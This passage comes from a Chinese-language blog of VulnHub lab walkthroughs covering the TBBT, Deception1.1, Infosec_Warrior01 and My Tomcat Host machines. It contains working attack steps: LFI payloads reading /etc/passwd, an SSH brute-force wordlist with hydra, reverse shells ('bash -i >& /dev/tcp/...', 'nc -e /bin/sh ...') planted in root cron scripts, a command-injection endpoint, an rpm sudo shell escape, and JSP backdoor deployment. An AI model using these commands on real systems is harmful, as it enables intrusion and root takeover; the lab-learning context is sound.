class="line">Your file has been written to: var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg.out</span><br><span class="line"></span><br><span class="line">cat var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg.out</span><br><span class="line">FLAG-howard&#123;b3d1baf22e07874bf744ad7947519bf4&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-howard&#123;b3d1baf22e07874bf744ad7947519bf4&#125;</code></strong></p><ul><li>FLAG-leonard</li></ul><p>查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line"></span><br><span class="line"># &#x2F;etc&#x2F;crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># m h dom mon dow usercommand</span><br><span class="line">17 ** * *root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly</span><br><span class="line">25 6* * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )</span><br><span class="line">47 6* * 7roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )</span><br><span class="line">52 61 * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )</span><br><span class="line">*&#x2F;1 ** * *root&#x2F;home&#x2F;leonard&#x2F;thermostat_set_temp.py</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p>查看文件<code>/home/leonard/thermostat_set_temp.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;leonard</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 root root 42 Mar 30 15:52 thermostat_set_temp.sh</span><br></pre></td></tr></table></figure><blockquote><p>计划任务里写的是<code>.py</code>，但这里是<code>.sh</code>?</p></blockquote><p>文件可写，可以写入反弹bash命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.3&#x2F;9990 0&gt;&amp;1&quot; &gt; &#x2F;home&#x2F;leonard&#x2F;thermostat_set_temp.sh</span><br></pre></td></tr></table></figure><p>本地监听9990端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9990</span><br><span class="line">Ncat: Version 7.80 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::9990</span><br><span class="line">Ncat: Listening on 0.0.0.0:9990</span><br><span class="line">Ncat: Connection from 192.168.1.105.</span><br><span class="line">Ncat: Connection from 192.168.1.105:42922.</span><br><span class="line">bash: cannot set terminal process group (2108): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p>查看flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat FLAG-leonard.txt</span><br><span class="line">FLAG-leonard&#123;17fc95224b65286941c54747704acd3e&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-leonard&#123;17fc95224b65286941c54747704acd3e&#125;</code></strong></p><hr /><blockquote><p><code>/etc/crontab</code></p></blockquote><p>由于之前一直没有接触到计划任务的提权方法，在操作过程中便没有想到这一点<br />其原理大概与SUID差不多，低权用户以高权用户的身份执行命令</p><blockquote><p>grep高亮</p></blockquote><p>在grep节选flag时，出现了回显，便说明存在&quot;FLAG&quot;字样，但是由于字符太多、太密，难以寻找flag<br />个人操作时直接将文本拷贝至windows的notepad++中，然后Ctrl+F查找<br />后来想到grep可以高亮文本，加上参数<code>--color=auto</code>即可</p><blockquote><p>搜点</p></blockquote><p>或许用信息扫荡来描述这一行为更合适<br />当时个人状态不佳，没有仔细思考就用ftp客户端连上服务器，然后用<code>get</code>命令一个一个地下载文件<br />后来发现还是漏了一些比较重要的信息<br />或许在动手之前需要思考下，如何获取信息是最便捷的，有哪些地方需要搜查，否则可能会因为一次搜点的小疏漏而让工作量提升一半。</p><p>参考资料</p><blockquote><p><a href="https://www.hackingarticles.in/tbbt-funwithflags-vulnhub-walkthrough/">WP</a><br /><a href="https://www.cnblogs.com/markLogZhu/p/11398028.html">Mysql.Backup</a><br /><a href="https://www.cnblogs.com/hujiapeng/p/8470099.html">curl.Download</a><br /><a href="https://blog.csdn.net/u014236541/article/details/44516465">grep.highlight</a></p></blockquote><hr /><h1 id="deception11"><a class="markdownIt-Anchor" href="#deception11"></a> <a href="https://www.vulnhub.com/entry/haclabs-deception11,440/">Deception1.1</a></h1><p><code>2020/04/04 23:31:03</code></p><h2 id="端口扫描-15"><a class="markdownIt-Anchor" href="#端口扫描-15"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.110</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.110</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 75:b3:93:d4:f1:02:30:bf:35:ea:12:4e:3b:e7:fa:4a (RSA)</span><br><span class="line">|   256 f9:8c:43:5b:45:7d:fe:84:b1:f5:93:a3:68:bb:ce:84 (ECDSA)</span><br><span class="line">|_  256 77:2a:33:3e:8f:2b:65:a5:f3:df:b5:bc:58:4a:f4:8e (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS HEAD GET</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">MAC Address: 08:00:27:4B:4E:6D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 22.680 days (since Thu Mar 12 19:47:39 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-15"><a class="markdownIt-Anchor" href="#web路径枚举-15"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.110/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.110&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.110&#x2F;index.html (CODE:200|SIZE:1315)                                      </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.110&#x2F;manual&#x2F;                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.110&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-15"><a class="markdownIt-Anchor" href="#漏洞利用-15"></a> 漏洞利用</h2><ul><li>访问<code>/</code></li></ul><p>该页面提供一个密码强度检测的功能<br />若密码中含有大写字母、小写字母、数字、特殊符号，且长度为8位及上，则会用alert弹出信息<br /><code>0000flagflagflagflag.php</code><br />而且页面内的内容为<br /><code>Password is strong , contains all 4 things(uppercase,lowercase,number,specialchars) with flag=1</code><br />这里的<code>with flag=1</code>就是个提示</p><p>尝试后发现存在php文件<code>/00001111.php</code><br />alter弹出信息为<code>find password.txt</code><br />页面内容为空白<br />源代码中存在注释信息<code>use ?page=</code><br />即可以使用get参数page</p><p>访问<code>/00001111.php?page=index.html</code><br />此时以页面为主页，则可判断page参数存在包含功能<br />有两种利用方式</p><ul><li>php伪协议进行LFI</li><li>file伪协议直接读取文件</li></ul><p>测试过程中两种方法均可使用，POC如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>尝试寻找password.txt<br />最后在找到路径为<code>/var/password.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;password.txt</span><br><span class="line"></span><br><span class="line">I know the password for yash : ya5h** but I forgot the last 2 words. find them and use to connect to SSH </span><br></pre></td></tr></table></figure><p>构造字典如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat dic.py</span><br><span class="line"></span><br><span class="line">#!&#x2F;bin&#x2F;python2</span><br><span class="line"></span><br><span class="line">raw &#x3D; &#39;ya5h&#39;</span><br><span class="line">charset &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#96;~!@#$%^&amp;*()_+-&#x3D;[]&#123;&#125;\|;:\&#39;&quot;,.&lt;&gt;&#x2F;?&#39;</span><br><span class="line"></span><br><span class="line">for i in charset:</span><br><span class="line">    for j in charset:</span><br><span class="line">        print raw + i + j</span><br></pre></td></tr></table></figure><p>使用hydra对于SSH服务进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python dic.py &gt; pass</span><br><span class="line">hydra -I -l yash -P pass -V ssh:&#x2F;&#x2F;192.168.31.110</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.31.110   login: yash   password: ya5hay</span><br></pre></td></tr></table></figure><p>得到账户yash</p><h2 id="权限提升-15"><a class="markdownIt-Anchor" href="#权限提升-15"></a> 权限提升</h2><p>登入服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh yash@192.168.31.110</span><br><span class="line">ya5hay</span><br></pre></td></tr></table></figure><p>查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line"></span><br><span class="line"># &#x2F;etc&#x2F;crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name command to be executed</span><br><span class="line">17 ** * *root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly</span><br><span class="line">25 6* * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )</span><br><span class="line">47 6* * 7roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )</span><br><span class="line">52 61 * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )</span><br><span class="line">#</span><br><span class="line">*&#x2F;1 * * * * &#x2F;home&#x2F;yash&#x2F;perm.sh</span><br></pre></td></tr></table></figure><p>查看文件<code>/home/yash/perm.sh</code>的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;yash&#x2F;perm.sh </span><br><span class="line"></span><br><span class="line">-rwxrw-rw- 1 root root 29 Apr  5  2020 &#x2F;home&#x2F;yash&#x2F;perm.sh</span><br></pre></td></tr></table></figure><p>该文件可写，可以利用改文件进行计划任务提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;nc -e &#x2F;bin&#x2F;sh 192.168.31.10 9890&#39; &gt; perm.sh</span><br></pre></td></tr></table></figure><p>Kali上监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9890</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/wh4am1/p/6542398.html">LFI</a></p></blockquote><hr /><h1 id="infosec_warrior01"><a class="markdownIt-Anchor" href="#infosec_warrior01"></a> <a href="https://www.vulnhub.com/entry/infosecwarrior-ctf-2020-01,446/">Infosec_Warrior01</a></h1><p><code>2020/04/12 11:41:51</code></p><h2 id="端口扫描-16"><a class="markdownIt-Anchor" href="#端口扫描-16"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.172</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.172</span><br><span class="line">Host is up (0.00054s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 5.3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 2f:b3:a5:cd:e5:14:33:a1:82:3b:dd:5a:5e:d7:59:36 (DSA)</span><br><span class="line">|_  2048 2d:b4:15:28:36:d8:b5:4e:18:81:8e:af:3e:e4:de:c1 (RSA)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.2.15 ((CentOS))</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: GET HEAD POST OPTIONS TRACE</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache&#x2F;2.2.15 (CentOS)</span><br><span class="line">|_http-title: Apache HTTP Server Test Page powered by CentOS</span><br><span class="line">MAC Address: 08:00:27:EC:26:4D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X|3.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6 cpe:&#x2F;o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13</span><br><span class="line">Uptime guess: 0.001 days (since Sat Apr 11 23:43:10 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-16"><a class="markdownIt-Anchor" href="#web路径枚举-16"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.172/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.172&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.172&#x2F;cgi-bin&#x2F; (CODE:403|SIZE:290)                                         </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.172&#x2F;sitemap.xml (CODE:200|SIZE:292)                                      </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.172&#x2F;wordpress&#x2F;</span><br></pre></td></tr></table></figure><ul><li>访问<code>http://192.168.31.172/wordpress/</code></li></ul><p>响应状态码为500，显示<code>Error establishing a database connection</code><br />Wordpress框架不可用</p><ul><li>访问<code>http://192.168.31.172/sitemap.xml</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;urlset&gt;</span><br><span class="line">&lt;url&gt;</span><br><span class="line">&lt;loc&gt;http:&#x2F;&#x2F;infosecwarrior.com&#x2F;index.htnl&lt;&#x2F;loc&gt;</span><br><span class="line">&lt;lastmod&gt;2020-02-13&lt;&#x2F;lastmod&gt;</span><br><span class="line">&lt;changefreq&gt;monthly&lt;&#x2F;changefreq&gt;</span><br><span class="line">&lt;priority&gt;0.8&lt;&#x2F;priority&gt;</span><br><span class="line">&lt;&#x2F;url&gt;</span><br><span class="line">&lt;&#x2F;urlset&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-16"><a class="markdownIt-Anchor" href="#漏洞利用-16"></a> 漏洞利用</h2><p>访问<code>http://192.168.31.172/sitemap.xml</code>有一行内容<br /><code>&lt;loc&gt;http://infosecwarrior.com/index.htnl&lt;/loc&gt;</code></p><p>访问<code>http://192.168.31.172/index.htnl</code>成功</p><p>审计html代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;cmd.php&quot; method&#x3D;&quot;GET&quot; hidden&#x3D;&quot;True&quot;&gt;</span><br><span class="line"> command</span><br><span class="line">     &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;AI&quot; value&#x3D;&quot;&quot; maxlength&#x3D;&quot;100&quot;&gt;</span><br><span class="line"> &lt;br&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>删去<code>hidden=&quot;True&quot;</code><br />尝试进行命令执行，在表单中输入<code>ls</code><br />回显为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Now the main part what it is loooooool</span><br><span class="line">Try other method</span><br></pre></td></tr></table></figure><p>而且URL为<code>http://192.168.31.172/cmd.php?AI=ls</code></p><p>改为POST请求<br />执行成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.31.172&#x2F;cmd.php -d &quot;AI&#x3D;ls&quot;</span><br><span class="line"></span><br><span class="line">You Found ME : - (</span><br><span class="line"></span><br><span class="line">cmd.php</span><br><span class="line">hacker.gif</span><br><span class="line">index.htnl</span><br><span class="line">minnions.gif</span><br><span class="line">note.txt</span><br><span class="line">sitemap.xml</span><br><span class="line">wordpress</span><br></pre></td></tr></table></figure><p>即存在命令执行漏洞</p><p>查看cmd.php的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.31.172&#x2F;cmd.php -d &quot;AI&#x3D;cat cmd.php&quot;</span><br><span class="line"></span><br><span class="line">$user&#x3D;&quot;isw0&quot;;</span><br><span class="line">$pass&#x3D;&quot;123456789blabla&quot;;</span><br></pre></td></tr></table></figure><p>获取到账户</p><h2 id="权限提升-16"><a class="markdownIt-Anchor" href="#权限提升-16"></a> 权限提升</h2><p>登入服务器的SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh isw0@192.168.31.172</span><br><span class="line">123456789blabla</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">User isw0 may run the following commands on this host:</span><br><span class="line">    (!root) NOPASSWD: &#x2F;bin&#x2F;bash</span><br><span class="line">    (root) &#x2F;bin&#x2F;ping, (root) &#x2F;bin&#x2F;ping6, (root) &#x2F;bin&#x2F;rpm, (root) &#x2F;bin&#x2F;ls, (root) &#x2F;bin&#x2F;mktemp</span><br></pre></td></tr></table></figure><p>使用root账户的rpm命令进行权限提升</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root rpm --eval &#39;%&#123;lua:posix.exec(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) context&#x3D;unconfined_u:system_r:rpm_script_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure><hr /><blockquote><p>Wordpress服务500</p></blockquote><p>在之前的靶机中从来没有遇到这个情况，便主观地猜测靶机配置是否有误，最后看WP的思路才让我顿悟。有几分脑洞，但是sitemap.xml也确实被dirb扫描出来了，里面的<code>index.htnl</code>也是在提示玩家，只能说收集信息的时候还是要仔细看看，毕竟<code>index.html</code>和<code>index.htnl</code>乍一看太难以区分</p><blockquote><p>rpm执行命令</p></blockquote><p>乍一看rpm有sudo，以为要构造恶意安装包来获取提权，没想到rpm可以直接执行命令</p><p>参考资料</p><blockquote><p><a href="https://www.armourinfosec.com/infosecwarrior-ctf-2020-01-walkthrough/">WP</a><br /><a href="https://cooolis.payloads.online/lolbas/Linux/rpm/">rpm.payload</a></p></blockquote><hr /><h1 id="my-tomcat-host-1"><a class="markdownIt-Anchor" href="#my-tomcat-host-1"></a> <a href="https://www.vulnhub.com/entry/my-tomcat-host-1,457/">My Tomcat Host: 1</a></h1><p><code>2020/04/25 00:43:06</code></p><h2 id="寻找靶机ip"><a class="markdownIt-Anchor" href="#寻找靶机ip"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/00.png" alt="" /></p><h2 id="端口扫描-17"><a class="markdownIt-Anchor" href="#端口扫描-17"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.166</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/01.png" alt="" /></p><h2 id="web路径扫描"><a class="markdownIt-Anchor" href="#web路径扫描"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.166:8080/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/02.png" alt="" /></p><h2 id="漏洞利用-17"><a class="markdownIt-Anchor" href="#漏洞利用-17"></a> 漏洞利用</h2><p>用浏览器访问8080端口的页面</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/03.png" alt="" /></p><p>点击左侧<code>Manager App</code>按钮进行登录，使用默认账户<code>tomcat:tomcat</code>登入成功</p><p>上传jsp后门</p><p>这里用了两个jsp后门<br />一个用于浏览文件(<a href="https://github.com/rohitcoder/BackDoors">https://github.com/rohitcoder/BackDoors</a>)<br />一个用于执行命令(<a href="https://www.cnblogs.com/swyft/articles/5563732.html">https://www.cnblogs.com/swyft/articles/5563732.html</a>)<br />第一个后门的执行命令模块无法使用</p><p>保存后门，压缩zip包，改后缀为war，然后在Manager页面进行war包的部署<br /><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/04.png" alt="" /></p><p>war包的部署就相当于在网站根目录解压了war包，访问时需要war包的文件名以及包内的文件名</p><p>如：<br 